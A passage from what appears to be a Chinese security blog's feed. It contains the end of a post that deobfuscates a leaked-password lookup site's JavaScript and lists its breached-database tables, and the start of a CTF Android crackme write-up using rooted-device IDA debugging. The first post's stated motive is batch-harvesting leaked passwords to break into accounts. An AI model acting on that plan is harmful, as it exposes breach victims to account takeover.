h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;&apos;, &apos;||||||||||搜MD5|SOMD5|_|var|function|length|100|somd5comb93c3a502|if|somd5com490d63bb2|u67e5|somd5comf94f3be31|somd5com4af3e5365|selecting|somd5comdd52905dc|u8be2|insertCell|progress|somd5comf53e662dd|Administry|somd5combdba21b9c|stend|innerHTML|somd5comd7f929c0a|somd5comf1d14de2e|u8017|u65f6|u79d2|u6beb|u952e|u5b57|somd5com956a89722|u5173|somd5_table|key|somd5com9a3a7ef82|val|alert|somd5comd152c7b41|somd5com326e7999e|u6bd5|rows|getElementById|document|return|u5b8c|u6570|database|u636e|decimal|somd5com5b49d9f12|u8bf7|||||||||||somd5com3b1df0e8d|somd5comdcaedb43e|somd5comf78518fb1|somd5comf46beb405|somd5com738c8372f|Math|u5230|else|somd5com36f2c91c7|u641c|u7d22|somd5com3de2f8f6d|somd5comb9e3341a3|u5bb9|match_act|select_act|u6ca1|u5185|somd5com4d38b6944|u6709|u6761|u91cf|false|get_del|somd5comed2bd7eb6|css|somd5com6cd7bc889|somd5com16af76eea|value_tables|addRow|get_data|new|Date|getTime|somd5com6d6674984|somd5comf49be7e59|somd5com25f9df3a7|get_okcount|somd5com4823e252c|u5ea6|ajax|somd5come0b7918e1|get_jdt|block|ajax_post|display|somd5com811fa93b4|somd5comeff53bcd1|tbody|来打我啊|SOMD55|傻逼|||||||||||你TM的来打我啊|php|table|act|u8f93|select|u5728|u6b63|u603b|POST|u8fdb|u5165|u60a8|u627e|u7684|操你妈|u5462|u7bb1|u90ae|u957f|u4e8e4|u5927|30|getdata|31|33|32|eval|url|type|data|indexOf|success|focus|39|38|dataxxxx|40|somd5comea98952b0|gat_kong|35|34|36|for|37|pow|empty|insertRow|somd5comb39f98f6a|round&apos;, &apos;|&apos;];</span><br><span class="line">eval(function(somd5comf3298c8c5, somd5com3de2f8f6d, somd5comf78518fb1, somd5com6d38bb14b, e, somd5comd152c7b41) &#123;</span><br><span class="line"> //</span><br><span class="line">    e = function(somd5com21a288587) &#123;</span><br><span class="line">        return (somd5com21a288587 &lt; somd5com3de2f8f6d ? _$[0] : e(parseInt(somd5com21a288587 / somd5com3de2f8f6d))) + ((somd5com21a288587 = somd5com21a288587 % somd5com3de2f8f6d) &gt; 35 ? String[&quot;fromCharCode&quot;](somd5com21a288587 + 29) : somd5com21a288587[&quot;toString&quot;](36))</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    if (!_$[1][&quot;replace&quot;](/^/, String)) &#123;</span><br><span class="line">        while (somd5comf78518fb1--)</span><br><span class="line">            somd5comd152c7b41[e(somd5comf78518fb1)] = somd5com6d38bb14b[somd5comf78518fb1] || e(somd5comf78518fb1);</span><br><span class="line">        somd5com6d38bb14b = [function(somd5com8f18e7d16) &#123;</span><br><span class="line">            return somd5comd152c7b41[somd5com8f18e7d16]</span><br><span class="line">        &#125;</span><br><span class="line">        ];</span><br><span class="line">        e = function() &#123;</span><br><span class="line">            return _$[2]</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        somd5comf78518fb1 = 1</span><br><span class="line">    &#125;</span><br><span class="line">    ;while (somd5comf78518fb1--)</span><br><span class="line">        if (somd5com6d38bb14b[somd5comf78518fb1])</span><br><span class="line">            somd5comf3298c8c5 = somd5comf3298c8c5[&quot;replace&quot;](new RegExp(_$[3] + e(somd5comf78518fb1) + _$[4],_$[5]), somd5com6d38bb14b[somd5comf78518fb1]);</span><br><span class="line">    return somd5comf3298c8c5</span><br><span class="line">&#125;(_$[6], 62, 184, _$[7][&quot;split&quot;](_$[8]), 0, &#123;&#125;))</span><br></pre></td></tr></table></figure> <p>有没有感觉很熟悉的结果，就是上面解密的哪个函数，参数变量真tmd<br>好看。不详细说了，跟前一次一样，最后返回一个解密的js代码，给eval执行。</p> <p>这次dump出来看到了要的东西了！注释都有了，就不说了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function getdata() &#123;</span><br><span class="line">    $(_$[28])[&quot;css&quot;](_$[29], _$[30]);</span><br><span class="line">    get_del();</span><br><span class="line">    var somd5com490d63bb2 = $(_$[31])[&quot;val&quot;]();//输入</span><br><span class="line">    if (somd5com490d63bb2 == _$[32]) &#123;</span><br><span class="line">        $(_$[33])[&quot;focus&quot;]();</span><br><span class="line">        alert(_$[34]);</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    ;if (somd5com490d63bb2[&quot;length&quot;] &lt; 4) &#123;</span><br><span class="line">        alert(_$[35]); //&quot;关键字长度请大于4!!&quot;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    ;var somd5combdba21b9c = $(_$[36])[&quot;val&quot;](); //选择的搜索类型，1，2,3</span><br><span class="line">    var somd5comd7f929c0a = $(_$[37])[&quot;val&quot;](); //匹配类型，1模糊,2精确</span><br><span class="line">    somd5com326e7999e = new Date()[&quot;getTime&quot;](); //时间戳</span><br><span class="line">    somd5comdd52905dc = 0;</span><br><span class="line">    for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</span><br><span class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>诶，忘了一件事，我们是找table的，在哪里呢？！</p> <p>其实就是上面代码中的database了，这里循环每个table通过get_data(内部ajax访问)来搜索结果。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</span><br><span class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>在dump出来的js代码中一搜，database没有找到定义，我靠！什么情况！调试到getdata时，确实是有值的，dump内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,</span><br><span class="line">&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,</span><br><span class="line">...] //一部分</span><br></pre></td></tr></table></figure> <p>但是我能就这么算了吗？！database究竟哪里来的，真想只有一个，去html再看一眼，搜到如下内容，嗯，看来是了，服务器返回的database。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./ajax.php?act=database&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>访问<code>http://cha.hxsec.com/ajax.php?act=database</code>，拿到返回的结果</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var database = new Array(&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,&quot;51job_com&quot;,&quot;52pk_com&quot;,&quot;55_la&quot;,&quot;766_tuan800_wanmei_37&quot;,&quot;7k7k_com&quot;,&quot;admin5_apphan_07073_soyun&quot;,&quot;aipai_com&quot;,&quot;all_hack_website&quot;,&quot;av_creditcard_com_cn&quot;,&quot;ccidnet_lashou_com&quot;,&quot;cnnb_mop_qinbao_jiapin_qd315&quot;,&quot;cnzz_com&quot;,&quot;co188_com&quot;,&quot;csdn_net&quot;,&quot;damai_cn&quot;,&quot;dangdang_com&quot;,&quot;dodonew_com&quot;,&quot;gfan_com&quot;,&quot;hiapk_com&quot;,&quot;houdao_com&quot;,&quot;ipart_cn&quot;,&quot;jxjatv_073yx_moko_treo8_paojiao&quot;,&quot;jxrsrc_zhenai&quot;,&quot;kaixin001_com-ispeak_com&quot;,&quot;mail_126_com&quot;,&quot;mail_163_com&quot;,&quot;mail_qq_sina&quot;,&quot;mail_qq_sohu&quot;,&quot;pconline_com_cn&quot;,&quot;pingan_com&quot;,&quot;qiannao_dedecms_baofeng&quot;,&quot;qq_old_password&quot;,&quot;radius-qingdaonews_com&quot;,&quot;renren_com&quot;,&quot;seowhy_shooter-tatazu_book118_cs&quot;,&quot;sorry_unknown&quot;,&quot;sorry_unknown2&quot;,&quot;tgbus_com&quot;,&quot;tpy100_com-jia_com&quot;,&quot;uuu9_com&quot;,&quot;weibo_com&quot;,&quot;xda_comicdd_game&quot;,&quot;xiaohua_other&quot;,&quot;xiaomi_com&quot;);</span><br></pre></td></tr></table></figure> <p>也知道前面的database变量怎么来的了，为了database有效，<code>ajax.php?act=database</code>是在system.js加载完之后发送的请求。</p> <h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>ok，分析告一段落，table拿到了，接口所有信息都弄清楚了，下面就是开始码代码了！</p> <p>另外，我只想对写system.js的同志说，nmmmp！那一段中文啥用没有，只能激起fn！</p> <p>有不敬之处，敬请见谅！</p> <p>有一点小小的分析技巧：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//猜猜怎么看！</span><br></pre></td></tr></table></figure> <div style="display:none;"><br><br>这种eval(x)如何分析呢？这里分享一个技巧<br>调试中，得到x之后，如果继续f10，那肯定就飞了，还要继续分析的，怎么办呢？<br><br>使用下面的方法：<br>x = “debugger;\r\n” + x;<br><br>然后f10就会在debugger断下来，然后就跟普通的js分析一样了<br><br>感谢chrome强大的工具！<br><br>希望这点没让大家失望！<br><br></div>  <p>代码地址，有需要请移步：<br><a href="https://github.com/anhkgg/hxsec_search" target="_blank" rel="noopener">https://github.com/anhkgg/hxsec_search</a></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze">https://anhkgg.github.io/hxsec-search-pwd-interface-analyze</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;0x00-开始&quot;&gt;&lt;a href=&quot;#0x00-开始&quot; class=&quot;headerlink&quot; title=&quot;0x00 开始&quot;&gt;&lt;/a&gt;0x00 开始&lt;/h1&gt;&lt;p&gt;最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…&lt;/p&gt; &lt;p&gt;在 &lt;a href=&quot;https://www.sec-wiki.com/topic/12&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sec-wiki&lt;/a&gt; 找到了&lt;a href=&quot;http://cha.hxsec.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这个密码泄露查询网站&lt;/a&gt;。&lt;/p&gt; &lt;p&gt;随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。&lt;/p&gt; &lt;p&gt;but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。&lt;/p&gt; &lt;p&gt;分析一下hxsec的查询接口，用python批量一下。&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="cha.hxsec.com" scheme="https://anhkgg.github.io/tags/cha-hxsec-com/"/>            <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="requests" scheme="https://anhkgg.github.io/tags/requests/"/>            <category term="password" scheme="https://anhkgg.github.io/tags/password/"/>            <category term="密码泄漏" scheme="https://anhkgg.github.io/tags/%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F/"/>            <category term="华西安全网" scheme="https://anhkgg.github.io/tags/%E5%8D%8E%E8%A5%BF%E5%AE%89%E5%85%A8%E7%BD%91/"/>        </entry>      <entry>     <title>看雪CTF2017第六题 Ericky-apk writeup</title>     <link href="https://anhkgg.github.io/kxctf2017-writeup6/"/>     <id>https://anhkgg.github.io/kxctf2017-writeup6/</id>     <published>2017-06-13T08:37:12.000Z</published>     <updated>2017-06-17T08:49:05.650Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>题目入口：<a href="http://ctf.pediy.com/game-fight-36.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-36.htm</a></p> <p>本题是安卓cm，目测肯定需要调试so。</p> <p>准备工具：</p> <ol> <li>ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）</li> <li>IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6</li> <li>adb(ApkIde改之理就有)</li> </ol> <a id="more"></a> <h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>将6-Ericky kanxue.apk拖进ApkIDE改之理，等待编译（没有加壳），ok。</p> <p>在右侧树结构栏中，找到smali-&gt;android-&gt;com-&gt;miss-&gt;rfchen，列表中就是java层的主要函数。</p> <p>点击MainActivity.smali，然后点击工具栏中jd-gui.exe，抓到java源码查看。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class MainActivity extends Activity</span><br><span class="line">&#123;</span><br><span class="line">  private EditText ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = null;</span><br><span class="line">  private Button ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = null;</span><br><span class="line"></span><br><span class="line">  protected void onCreate(Bundle paramBundle)</span><br><span class="line">  &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2130968603);</span><br><span class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = ((Button)findViewById(2131427415));</span><br><span class="line">    this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = ((EditText)findViewById(2131427416));</span><br><span class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ.setOnClickListener(new View.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">      public void onClick(View paramView)</span><br><span class="line">      &#123;</span><br><span class="line">        MainActivity.this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ()</span><br><span class="line">  &#123;</span><br><span class="line">    String str = this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ.getText().toString().trim();</span><br><span class="line">    StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">    localStringBuilder.append(str);</span><br><span class="line">    if (utils.check(localStringBuilder.toString().trim()))</span><br><span class="line">    &#123;</span><br><span class="line">      Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxxx&quot;), 0).show();</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxx&quot;), 0).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>这混淆的函数名我也是醉了，但这都不重要。输入key之后，然后点击按钮，进入OnClick，调用了上面代码中第二个函数（什么？我怎么知道的，因为它们哪个…点号…的函数名相同！！）。</p> <p>然后调用了utils.check来验证，成功提示！这里成功和错误提示的字符串做过变换，通过utils.dbcb解密，不细看了，不重要！</p> <p>进入utils.java，看到加载了so，调用的是这个so的导出函数，看反编译目录lib/armeabi-v7a（只提供了arm的so，要有个x86的好了），知道这个so是librf-chen.so。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//典型的NDK调用，查查就知道了！</span><br><span class="line">package com.miss.rfchen;</span><br><span class="line"></span><br><span class="line">public class utils</span><br><span class="line">&#123;</span><br><span class="line">  static</span><br><span class="line">  &#123;</span><br><span class="line">    System.loadLibrary(MainActivity.1.utils.dbcb(&quot;xxxx&quot;));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static native boolean check(String paramString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>那么重点来了，要分析librf-chen.so的check函数，才能搞定此题。</p> <h1 id="准备调试"><a href="#准备调试" class="headerlink" title="准备调试"></a>准备调试</h1><p>早上提前学习了一下so调试方法，找到了看雪安卓大神的教程，就是参考中的IDA动态调试技术，然后用上了，很好用！</p> <h2 id="跟着走"><a href="#跟着走" class="headerlink" title="跟着走"></a>跟着走</h2><p>下面开始照着做。</p> <ol> <li>连上手机（或者模拟器），使用adb devices看看成功连上没有</li> <li>adb push ../dbgsrv/android_server /sdcard/sv，教程是直接放入/data/data，一般权限不够</li> <li>然后进入shell，adb shell，输入su，获得root权限，然后cp /sdcard/sv /data/data/sv</li> <li>修改sv权限，chmod 777 /data/data/sv</li> <li>运行sv，/data/data/sv，默认监听到23946端口，Listening on port #23946。这步有个细节，不能直接adb shell /data/data/sv，这样权限不够，无法读取到进程信息，需要adb shell; su; /data/data/sv</li> <li>再开一个cmd，然后运行adb forward tcp:23946 tcp:23946</li> <li>运行一个idaq.exe，然后在菜单debugger-&gt;attach-&gt;remote Armlinux/android debugger，输入localhost, 23946,ok</li> <li>弹出进程框，按下Alt+T，输入chen，搜索到1808 [32] com.miss.rfchen，ok</li> <li>F9运行</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\ApkIDEz&gt;    .\adb.exe shell</span><br><span class="line">shell@your phone:/ $ su</span><br><span class="line">su</span><br><span class="line">root@your phone:/ # /data/data/sv</span><br><span class="line">/data/data/sv</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.17. Hex-Rays (c) 2004-2014</span><br></pre></td></tr></table></figure> <p>在界面中输入key，然后点击按钮，此时librf-chen.so才加载，然后ctrl+s，alt+t，输入librf找到librf-chen.so的基地址信息(记为base)，记下来。</p> <p>用另一个ida打开librf-chen.so，找到check导出函数的偏移地址00002814，计算base+00002814，然后g在IDA调试器中输入该地址，加上断点。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</span><br></pre></td></tr></table></figure> <p>IDA基本调试快捷键和OD一样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F9: 运行</span><br><span class="line">F8: 步过</span><br><span class="line">F7：步入</span><br></pre></td></tr></table></figure></p> <p>F9，跑起来，然后再次点击按钮，就断下来，进入了check。</p> <p>下面就是跟和调试的过程了，看数据，看流程，分析算法！</p> <h2 id="arm汇编基础"><a href="#arm汇编基础" class="headerlink" title="arm汇编基础"></a>arm汇编基础</h2><p>得提前有个准备，看看arm指令，了解基本的指令，函数调用方式，下面列几个，更多的就看参考中的文章了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOVS 同x86的mov</span><br><span class="line">LDR 加载内存数据到寄存器</span><br><span class="line">STR 寄存器数据存入内存</span><br><span class="line">B/BL 跳转/函数调用</span><br><span class="line">TST/CMP 比较</span><br><span class="line">ADD/SUB 加/减</span><br></pre></td></tr></table></figure> <p>然后最主要的，函数调用的参数传递。arm默认使用的fastcall，通过r0,r1,r2,r3传递参数，超过4个参数，使用堆栈传递，r0也保存返回值。</p> <h2 id="关键点跟踪"><a href="#关键点跟踪" class="headerlink" title="关键点跟踪"></a>关键点跟踪</h2><p>在check断下之后，先是一段数据初始化，先滤过，然后blt sub_2874，进入关键函数</p> <p>然后看到通过MOVS，STR将一些字符放入了内存。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000288A 000 01 60                                         STR             R1, [R0]</span><br><span class="line">.text:0000288C 000 4A 20                                         MOVS            R0, #&apos;J&apos;</span><br><span class="line">.text:0000288E 000 79 21                                         MOVS            R1, #&apos;y&apos;</span><br><span class="line">.text:00002890 000 AD F8 22 00                                   STRH.W          R0, [SP,#arg_22]</span><br><span class="line">.text:00002894 000 AD F8 24 10                                   STRH.W          R1, [SP,#arg_24]</span><br><span class="line">.text:00002898 000 75 21                                         MOVS            R1, #&apos;u&apos;</span><br><span class="line">.text:0000289A 000 AD F8 26 10                                   STRH.W          R1, [SP,#arg_26]</span><br><span class="line">.text:0000289E 000 33 21                                         MOVS            R1, #&apos;3&apos;</span><br></pre></td></tr></table></figure> <p>接着就看让我恐惧的一幕，b loc_2898开始各种跳转，指令操作，然后刚跳完又是一个b xxx，接着各种跳转，毫无疑问，这是一段花指令了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000289E                 B               loc_2898</span><br></pre></td></tr></table></figure> <h2 id="花指令结构"><a href="#花指令结构" class="headerlink" title="花指令结构"></a>花指令结构</h2><p>经过多次跟踪，恶心到快吐的时候，终于看出话指令的基本结构了：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 